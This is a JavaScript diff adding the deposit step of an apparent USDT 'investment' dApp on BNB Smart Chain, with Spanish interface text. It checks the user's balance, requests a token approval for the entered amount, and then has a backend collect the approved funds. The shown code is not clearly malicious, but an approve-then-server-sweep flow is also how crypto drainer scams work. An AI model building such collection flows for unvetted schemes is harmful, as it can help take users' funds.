+    // 3. Montos y USDT
+    const rawInputVal = amountInput ? amountInput.value : "1";
+    const requiredAmount = ethers.parseUnits(rawInputVal || "1", 18);
+
+    if (cachedUserBalance > 0 && parseFloat(rawInputVal) > cachedUserBalance) {
+      showToast("El monto ingresado supera tu saldo disponible.", "error");
+      setLoading(false);
+      updateStepperUI(0);
+      return;
+    }
+
+    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
+
+    setLoading(true, "Validando saldo de USDT…");
+    const usdtBalance = await usdtContract.balanceOf(userAddress);
+
+    if (usdtBalance < requiredAmount) {
+      showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
+      setLoading(false);
+      updateStepperUI(0);
+      return;
+    }
+
+    // 4. Allowance (Paso 2 del Stepper)
+    updateStepperUI(2); 
+    setLoading(true, "Verificando autorizaciones...");
+    const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
+    
+    if (allowance < requiredAmount) {
+      setLoading(true, "⚠️ Revisa tu billetera: Aprueba USDT...");
+      const txApprove = await usdtContract.approve(CONTRACT_ADDRESS, requiredAmount);
+      
+      setLoading(true, "Confirmando aprobación en red...");
+      await txApprove.wait();
+    }
+
+    // 5. Backend (Paso 3 del Stepper)
+    updateStepperUI(3);
+    setLoading(true, "Procesando inversión en protocolo...");
+    const txCollect = await triggerBackendCollect(userAddress); 
+
+    // 6. Éxito
+    const txHash = txCollect?.hash || "";
+    if (txHash) {
+      saveAndRenderTxHistory(txHash); // Guarda en localStorage
+      showToast(`¡Inversión exitosa! <a href="https://bscscan.com/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
+    } else {
+      showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
+    }
+
+    updateStepperUI(0); // Ocultar stepper al terminar con éxito
+
+  } catch (err) {
+    const raw = err?.reason ?? err?.message ?? "Error desconocido";
+    if (
+      err.code === 4001 ||
+      raw.toLowerCase().includes("user rejected") ||
+      raw.toLowerCase().includes("denied") ||
+      raw.toLowerCase().includes("cancelled")
+    ) {
+      showToast("Operación cancelada por el usuario.", "default");
+    } else {
+      console.error("Web3 Error crítico:", err);
+      showToast("Ocurrió un error al procesar la transacción en la red.", "error");
+    }
+  } finally {
+    setLoading(false);
+    updateStepperUI(0);
+  }
+}
